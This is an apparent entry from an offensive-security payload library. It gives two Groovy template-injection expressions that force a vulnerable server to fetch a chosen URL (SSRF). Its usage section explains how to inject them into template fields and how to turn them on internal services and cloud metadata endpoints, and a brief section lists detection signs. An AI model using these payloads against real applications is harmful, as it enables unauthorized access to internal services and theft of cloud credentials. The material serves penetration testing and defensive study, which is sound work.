---
type: code
language: groovy
verified: true
tags:
  - ssti
  - groovy
  - payload
  - ssrf
platforms:
  - web
  - java
validated: true
---

# Groovy-SSTI-HTTP-Request-Payloads

## Code

```groovy
${"http://$_TARGET_URL".toURL().text}
${new URL("http://$_TARGET_URL").getText()}
```

## Description

This code snippet contains two equivalent Groovy expressions designed as payloads for Server-Side Template Injection (SSTI) attacks. Each forces the server to perform an HTTP GET request to a specified URL, enabling SSRF to access external or internal resources. The first uses string-to-URL conversion for obfuscation, while the second directly instantiates a URL object. These are injected into vulnerable template parameters to execute arbitrary network fetches on the server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_URL | The URL or hostname for the server to fetch (replace with attacker-controlled or internal endpoint) | www.google.com or localhost:8080/admin |

## Usage

Inject the payload into a user-controlled template field (e.g., via POST parameter or URL query) in a Groovy-enabled application. For testing, use a benign URL like Google; for exploitation, target internal services (e.g., metadata endpoints in cloud environments). Confirm execution by checking if the fetched content is echoed in the response or by monitoring inbound requests on your test server. This payload is referenced in procedures for initial SSTI confirmation and SSRF chaining.

## Detection

- Application logs showing Groovy template evaluation errors or unusual `${` patterns in inputs.
- Network monitoring for unexpected outbound HTTP requests from the web server to external/internal IPs.
- WAF alerts on SSTI signatures like `toURL().text` or `new URL(` in payloads.
- Response analysis for leaked external content (e.g., HTML snippets from unintended sites).

## Related

- [[procedures/Server-Side-Template-Injection-via-Groovy-HTTP-Request]]
